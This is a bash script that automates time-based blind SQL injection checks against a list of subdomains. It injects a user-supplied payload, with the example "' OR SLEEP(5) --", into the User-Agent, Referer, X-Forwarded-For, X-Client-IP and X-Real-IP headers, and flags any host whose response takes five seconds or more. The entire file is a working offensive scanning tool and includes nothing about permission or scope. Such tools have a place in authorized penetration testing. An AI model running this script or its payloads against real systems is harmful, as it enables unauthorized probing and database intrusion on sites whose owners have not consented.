#!/bin/bash

# Function to display usage of the script
usage() {
  echo "Usage: $0 -l <subdomain_list> -p <payload>"
  echo "-l : Path to file containing list of subdomains"
  echo "-p : SQLi payload to inject (e.g., \"' OR SLEEP(5) --\")"
  exit 1
}

# Parse command-line arguments
while getopts "l:p:" opt; do
  case $opt in
    l) subdomain_list="$OPTARG" ;;
    p) payload="$OPTARG" ;;
    *) usage ;;
  esac
done

# Check if required arguments are provided
if [[ -z "$subdomain_list" || -z "$payload" ]]; then
  usage
fi

# List of headers to check for SQL injection vulnerability
headers=("User-Agent" "Referer" "X-Forwarded-For" "X-Client-IP" "X-Real-IP")

# Function to check each subdomain with the provided payload
check_sqli() {
  local domain="$1"
  for header in "${headers[@]}"; do
    echo "Checking $domain with $header header..."
    start_time=$(date +%s.%N)
    
    # Perform the curl request with the injection in the specified header
    if ! curl -s -o /dev/null -H "$header: $payload" "$domain"; then
      echo "[ERROR] Failed to perform curl request to $domain"
      continue
    fi

    # Measure the response time
    end_time=$(date +%s.%N)
    response_time=$(echo "$end_time - $start_time" | bc)

    # If response time is 5 seconds or more, log the potential vulnerability
    if (( $(echo "$response_time >= 5" | bc -l) )); then
      echo "[VULNERABLE] $domain is vulnerable to SQLi on $header header!"
    fi
  done
}

# Loop through each subdomain in the list
while IFS= read -r domain; do
  if [[ -n "$domain" ]]; then
    check_sqli "$domain"
  fi
done < "$subdomain_list"
